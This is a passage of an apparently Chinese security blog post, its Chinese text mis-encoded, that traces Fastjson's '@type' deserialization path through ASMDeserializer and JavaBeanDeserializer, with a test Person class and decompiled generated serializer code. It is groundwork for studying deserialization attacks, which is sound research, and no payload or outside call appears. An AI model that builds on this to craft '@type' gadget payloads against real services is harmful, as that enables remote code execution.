var9.scanString(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> var9.scanString(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">        var5.setParam2(var7);</span><br><span class="line">        var5.setParam1(var6);</span><br><span class="line">        <span class="type">char</span> var8;</span><br><span class="line">        <span class="keyword">if</span> ((var8 = var9.getCurrent()) == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            var9.next();</span><br><span class="line">            var9.setToken(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var8 == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">            var9.next();</span><br><span class="line">            var9.setToken(<span class="number">15</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var8 == <span class="number">26</span>) &#123;</span><br><span class="line">            var9.next();</span><br><span class="line">            var9.setToken(<span class="number">20</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var9.nextToken(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åæ˜¯å»è°ƒç”¨è¿™ä¸ªæ–‡ä»¶é‡Œçš„deserializeã€‚æŠŠå‚æ•°å¸¦å…¥ï¼Œå¯¹ç…§æ–‡ä»¶çœ‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003173519001.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003173519001.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>thisï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003174827335.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003174827335.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>clazzå°±æ˜¯Person.classï¼ŒfieldNameä¸ºnull</p><p>lexer.tokenæ˜¯16ï¼Œè¿›å…¥else</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003173901258.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003173901258.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>token&#x3D;14æ‰è¿›å…¥deserialzeArrayMappingï¼Œç”¨äºå¤„ç†æ•°ç»„æ˜ å°„çš„æƒ…å†µï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ Person å¯¹è±¡å¹¶è®¾ç½®å…¶å­—æ®µå€¼ã€‚</p><p>çœ‹åˆ°è¾£å—ï¼Œåœ¨elseé‡Œ:</p><ul><li>new Person()æ–°å»ºäº†å¯¹è±¡ï¼Œå¹¶è®¾ç½®äº†ä¸€äº›ä¸Šä¸‹æ–‡ä¿¡æ¯</li><li>marchStatæ ¹æ®åŒ¹é…çŠ¶æ€è®¾ç½®æ ‡å¿—ä½ï¼Œè¡¨ç¤ºå“ªäº›å­—æ®µå·²è¢«è§£æ</li><li>æ ¹æ®æ ‡å¿—ä½è°ƒç”¨setteræ–¹æ³•è®¾ç½®Personå¯¹è±¡å­—æ®µå€¼</li></ul><p>returnå›æ¥çš„valueå°±æ˜¯èµ‹å¥½å€¼çš„Personå®ä¾‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003175302656.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003175302656.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="another-è°ƒè¯•"><a href="#another-è°ƒè¯•" class="headerlink" title="another è°ƒè¯•"></a>another è°ƒè¯•</h2><p>å‰é¢æåˆ°ï¼Œbuildåæœ‰ä¸€å †åˆ¤æ–­ï¼Œèƒ½æŠŠasmEnableç½®ä¸ºfalseï¼Œä½†ä¸€ä¸ªä¹Ÿèµ°ä¸è¿›å»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003160415598.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003160415598.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœasmEnableä¸ºfalseï¼Œä¼šè¿”å›JavaBeanDeserializer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003162040875.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003162040875.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ®å¤§ä½¬åˆ†æï¼Œè¿™é‡Œç‰¹æ®Šæ‰‹æ³•ä½¿asmEnable èµ°è¿›ä»»æ„ä¸€ä¸ªifç½®ä¸ºfalseï¼Œé‚£å°±èƒ½ç›´æ¥è°ƒè¯•äº†ã€‚ï¼ˆä½†æˆ‘è§‰å¾—æœ‰å¯èƒ½å’Œå‰é¢è‡ªç„¶æµç¨‹ç”Ÿæˆçš„å­—èŠ‚ç ä¸åŒï¼Œå°±å…ˆæçš„é‚£ä¸ªï¼‰ï¼Œå®é™…ä¸ŠasmEnable &#x3D; ture or falseéƒ½ä¸€æ ·ã€‚å¥½åƒæ˜¯ä¸ªè°ƒè¯•å¼€å…³</p><p>å¦‚æœä½ æƒ³ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œè°ƒè¯•ï¼Œéœ€è¦ä¿®æ”¹ä½ çš„Personç±»ï¼š</p><ul><li>ä½¿å…¶ä¸€ä¸ªå­—æ®µæœ‰getterï¼Œè€Œæ²¡æœ‰setterï¼›</li><li>å‚æ•°ä¸ªæ•°ä¸ä¸º1</li><li>è¿”å›å€¼æ˜¯Collection æˆ–å…¶å­ç±»ã€Map æˆ–å…¶å­ç±»ã€AtomicBooleanã€AtomicIntegerã€AtomicLongçš„ä¸€ç§ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.othercase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">intogetOnly_Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">intogetOnly_Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person Constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> Map param1;</span><br><span class="line">    <span class="keyword">private</span> String param2;</span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getParam1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getParam1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> param1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParam2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getParam2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> param2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParam2</span><span class="params">(String param2)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setParam2&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.param2 = param2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        String json = &quot;&#123;\&quot;@type\&quot;:\&quot;org.exploit.othercase.Person\&quot;,\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.exploit.othercase.intogetOnly_Person\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(json);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°±ä¼šèµ°åˆ°JavaBeanInfo.buildé‡ŒæŠŠgetteræ·»åŠ ï¼Œè·Ÿè¿›ä¸€ä¸‹addå®å‚ï¼Œ<code>new FieldInfo()</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003180209148.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003180209148.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”±äºå‚æ•°ä¸ªæ•°ä¸ä¸º1ï¼Œè¿›å…¥elseï¼ŒæŠŠgetOnlyç½®ä¸ºtrue</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003181518137.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003181518137.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°±ä¼šæŠŠasmEnableç½®ä¸ºfalseè¾£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003182145057.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003182145057.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¥çœ‹çœ‹è¿™ä¸ªè¿”å›çš„JavaBeanDeserializerå¹²äº†å•¥</p><p>é¢ï¼Œä¸€å †èµ‹å€¼ï¼Œæ ‡å‡†çš„æ„é€ å‡½æ•°ï¼Œæ²¡åˆ«çš„äº†ã€‚ç”¨äºåé¢è°ƒç”¨deserializer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006102636139.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006102636139.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>okï¼Œæˆ‘ä»¬ç»§ç»­èµ°åˆ°JavaBeanDeserializer.deserializer</p><p>å…ˆè°ƒç”¨createInstanceè¿›è¡Œå®ä¾‹åŒ–ï¼Œè§¦å‘æ— å‚æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006103242942.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006103242942.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åé¢ç”šè‡³è¿˜æœ‰è·å–ç§æœ‰æ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006103358051.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006103358051.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›åˆ°fieldDeser.setValue</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105134353.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105134353.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åå°„è°ƒç”¨setterèµ‹å€¼ï¼Œover </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105206876.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105206876.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç°åœ¨æ§åˆ¶å°é‡Œå°±è§¦å‘äº†æ„é€ å‡½æ•°å’Œsetteräº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105247434.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105247434.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åªæ˜¯æˆ‘è§‰å¾—è¿™ç§ç‰¹æ®Šæƒ…å†µè¿›å…¥çš„è°ƒè¯•è·Ÿå®é™…æƒ…å†µæœ‰äº›ä»£ç å¯èƒ½ä¸åŒï¼Œæˆ‘è§‰å¾—è¿˜æ˜¯æå–å­—èŠ‚ç åˆç†ä¸€äº›</p><p>é‚£getterä»€ä¹ˆæ—¶å€™è§¦å‘çš„å‘¢ï¼Ÿ</p><p>åœ¨parseçš„åé¢</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105417177.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105417177.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="toJSONè§¦å‘getter"><a href="#toJSONè§¦å‘getter" class="headerlink" title="toJSONè§¦å‘getter"></a>toJSONè§¦å‘getter</h2><p>è·Ÿè¿›åˆ°JSON.getObjectWriteré‡Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105725494.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006105725494.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆèµ°åˆ°createJavaBeanSerializer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006110537224.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006110537224.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›åˆ°createASMSerializerï¼Œè·Ÿå‰é¢çš„setterä¸€æ ·ï¼Œç”Ÿæˆå­—èŠ‚ç ï¼Œæ•´ç¬‘äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006110746031.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006110746031.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æå–è¿™ä¸ªå­—èŠ‚ç çš„codeå‘å¸ƒåœ¨ï¼š</p><p><a href="https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/othercase/fastjson/extract_ASMDeserializer.java">https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/othercase/fastjson/extract_ASMDeserializer.java</a></p><p>æå–å‡ºçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.alibaba.fastjson.serializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Type;</span><br><span class="line"><span class="keyword">import</span> org.exploit.othercase.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMSerializer_1_Person</span> <span class="keyword">extends</span> <span class="title class_">JavaBeanSerializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectSerializer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ASMSerializer_1_Person</span><span class="params">(SerializeBeanInfo var1)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(JSONSerializer var1, Object var2, Object var3, Type var4, <span class="type">int</span> var5)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">SerializeWriter</span> <span class="variable">var9</span> <span class="operator">=</span> var1.out;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.writeDirect(var1)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.writeNormal(var1, var2, var3, var4, var5);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var9.isEnabled(<span class="number">32768</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.writeDirectNonContext(var1, var2, var3, var4, var5);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Person</span> <span class="variable">var10</span> <span class="operator">=</span> (Person)var2;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.writeReference(var1, var2, var5)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var9.isEnabled(<span class="number">2097152</span>)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.writeAsArray(var1, var2, var3, var4, var5);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">SerialContext</span> <span class="variable">var11</span> <span class="operator">=</span> var1.getContext();</span><br><span class="line">                    var1.setContext(var11, var2, var3, <span class="number">0</span>);</span><br><span class="line">                    <span class="type">char</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="string">&#x27;&#123;&#x27;</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="string">&quot;param1&quot;</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">var13</span> <span class="operator">=</span> var10.getParam1();</span><br><span class="line">                    <span class="keyword">if</span> (var13 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                            var9.write(var12);</span><br><span class="line">                            var9.writeFieldNameDirect(var6);</span><br><span class="line">                            var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                            var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        var9.writeFieldValueStringWithDoubleQuoteCheck(var12, var6, var13);</span><br><span class="line">                        var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var6 = <span class="string">&quot;param2&quot;</span>;</span><br><span class="line">                    var13 = var10.getParam2();</span><br><span class="line">                    <span class="keyword">if</span> (var13 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var9.isEnabled(<span class="number">964</span>)) &#123;</span><br><span class="line">                            var9.write(var12);</span><br><span class="line">                            var9.writeFieldNameDirect(var6);</span><br><span class="line">                            var9.writeNull(<span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">                            var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        var9.writeFieldValueStringWithDoubleQuoteCheck(var12, var6, var13);</span><br><span class="line">                        var12 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (var12 == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        var9.write(<span class="number">123</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    